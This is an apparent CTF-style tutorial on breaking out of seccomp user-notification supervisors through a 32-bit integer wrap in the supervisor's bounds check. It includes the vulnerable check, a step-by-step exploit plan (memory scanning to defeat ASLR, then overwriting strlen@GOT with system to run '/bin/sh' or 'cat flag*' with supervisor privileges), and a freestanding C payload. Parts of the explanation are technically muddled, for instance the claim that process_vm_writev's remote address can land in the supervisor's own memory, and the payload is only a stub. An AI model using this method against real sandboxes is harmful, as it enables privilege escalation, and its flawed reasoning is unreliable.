# Seccomp User-Notification Supervisor Escapes

In modern security architectures and 2025–2026 CTFs (e.g. L3akCTF Supervisor), authors
employ `SECCOMP_RET_USER_NOTIF` to implement privileged "supervisor" processes that mediate
or emulate restricted syscalls on behalf of an unprivileged worker child.

A vulnerability in the supervisor's validation logic allows the untrusted child to achieve
**arbitrary read and write inside the supervisor process**, completely breaking the sandbox boundary.

---

## 1. Architecture of Seccomp User-Notification

```
+--------------------------+                         +-----------------------------+
|    Worker Process        |                         |     Supervisor Process      |
|  (Sandboxed Child)       |                         |  (Privileged Monitor)       |
+--------------------------+                         +-----------------------------+
             |                                                      |
             | 1. Intercepted Syscall                               |
             |    (e.g., emulated read/write)                       |
             +----------------------------> [ KERNEL ] ------------>| 2. ioctl(NOTIF_RECV)
             |                              (Worker paused)         |    Inspects req.data.args
             |                                                      |
             |                                                      | 3. process_vm_readv() /
             |                                                      |    process_vm_writev()
             |                                                      |<--------------------+
             |                                                      | Supervisor validates|
             |                                                      | & performs I/O      |
             |                                                      +---------------------+
             |                                                      |
             |<---------------------------- [ KERNEL ] <------------| 4. ioctl(NOTIF_SEND)
             | 5. Syscall returns result                            |    Responds with val
             v                                                      v
```

### Setup Sequence
1. Worker creates a notification listener:
   ```c
   struct sock_fprog prog = { ... }; /* filter returns SECCOMP_RET_USER_NOTIF */
   int notify_fd = syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &prog);
   ```
2. Worker passes `notify_fd` to supervisor (via Unix domain socket `SCM_RIGHTS` or across `fork()`).
3. Supervisor loops on:
   ```c
   struct seccomp_notif req = {0};
   ioctl(notify_fd, SECCOMP_IOCTL_NOTIF_RECV, &req);
   ```
4. Supervisor performs emulated operations using `process_vm_readv()` / `process_vm_writev()`.

---

## 2. The Vulnerability Archetype: 32-bit Integer Wrap in Emulated I/O

The supervisor receives 64-bit syscall arguments from `req.data.args[i]` but validates them
using 32-bit signed or unsigned integers:

```c
/* Vulnerable Supervisor Validation */
uint32_t offset = (uint32_t)req.data.args[0];
uint32_t count  = (uint32_t)req.data.args[1];

/* 32-bit integer addition overflow: offset + count wraps modulo 2^32 */
if (offset + count > MAX_ALLOWED_SIZE) {
    /* Reject out-of-bounds request */
    resp.error = -EINVAL;
    ioctl(notify_fd, SECCOMP_IOCTL_NOTIF_SEND, &resp);
    return;
}

/* Bounds check PASSED due to wrap! */
struct iovec local_iov  = { .iov_base = supervisor_buffer, .iov_len = count };
struct iovec remote_iov = { .iov_base = (void *)(worker_base + offset), .iov_len = count };

/* Supervisor performs I/O across process boundary */
process_vm_readv(worker_pid, &local_iov, 1, &remote_iov, 1, 0);
```

### The Wrap Mechanics
- Set `offset = 0xFFFFFFFF` (-1 as unsigned 32-bit).
- Set `count = 2`.
- `offset + count = 0x100000001` which truncates to `1` in 32-bit arithmetic!
- `1 <= MAX_ALLOWED_SIZE` passes validation!
- When passed to `process_vm_readv` / `process_vm_writev`, the 64-bit kernel interface evaluates
  the full address `worker_base + 0xFFFFFFFF`, addressing memory far beyond the allocated buffer.

---

## 3. Exploit Methodology: Achieving Supervisor Arbitrary R/W

### Step 1: Arbitrary Supervisor Read
When the supervisor emulates a write from worker into supervisor storage:
- By wrapping `offset`, the supervisor reads from worker memory at arbitrary locations or, if
  `local_iov` / `remote_iov` pointers are confused, reads supervisor internal buffers and returns
  them in the worker's syscall return value (`resp.val`).

### Step 2: Arbitrary Supervisor 8-Byte Write
When the supervisor emulates reading from supervisor storage into worker memory:
- Wrap `offset` so that `remote_iov` or the supervisor's destination pointer points into the
  **supervisor's own writable segments** (e.g., supervisor GOT, data segment, or return address).
- Worker sends the desired 8-byte payload; supervisor writes it directly into its own memory!

### Step 3: Defeating ASLR via Non-Crashing Memory Scan
`process_vm_readv` and `process_vm_writev` return `-1` with `errno == EFAULT` when given an
unmapped address **without terminating or crashing the target process**!
- The worker loops through potential page addresses (e.g. `0x555555554000` through `0x555555560000`).
- When a read succeeds (returns positive bytes), the page is mapped!
- Check ELF magic bytes (`\x7fELF`) to locate the supervisor binary base and libc base.

### Step 4: Control Flow Hijacking in Supervisor
Once supervisor base and libc base are located:
1. Identify a vulnerable function call in the supervisor (e.g. `strlen(user_string)`).
2. In Partial RELRO supervisor: Overwrite `strlen@GOT` with `system`.
3. Worker sends next request with string `"/bin/sh"` or `cat flag*`.
4. Supervisor calls `strlen("/bin/sh")` which resolves to `system("/bin/sh")` with supervisor privileges!

---

## 4. Freestanding C Payload (Zero Libc / Freestanding Syscalls)

In seccomp challenges, the worker environment is often restricted (`chroot`, stripped libc,
seccomp filter blocking standard execve). Write the payload in freestanding C:

```c
/* Build: gcc -nostdlib -static -no-pie -fno-stack-protector worker_exploit.c -o worker_exploit */

#define SYS_write              1
#define SYS_exit              60
#define SYS_process_vm_readv  310
#define SYS_process_vm_writev 311

typedef unsigned long uint64_t;

static inline long syscall3(long nr, long a1, long a2, long a3) {
    long ret;
    __asm__ volatile ("syscall" : "=a"(ret) : "a"(nr), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall6(long nr, long a1, long a2, long a3, long a4, long a5, long a6) {
    long ret;
    register long r10 __asm__("r10") = a4;
    register long r8  __asm__("r8")  = a5;
    register long r9  __asm__("r9")  = a6;
    __asm__ volatile ("syscall" : "=a"(ret) : "a"(nr), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
    return ret;
}

void _start(void) {
    /* Trigger emulated syscall with wrapped 32-bit parameters */
    uint64_t wrapped_offset = 0xFFFFFFFF00000000ULL | 0xFFFFFFFFULL;
    uint64_t count = 8;
    
    /* Syscall that triggers SECCOMP_RET_USER_NOTIF in supervisor */
    long res = syscall3(400 /* Custom Emulated Syscall */, (long)wrapped_offset, (long)count, 0);
    
    /* Exit worker */
    syscall3(SYS_exit, 0, 0, 0);
}
```
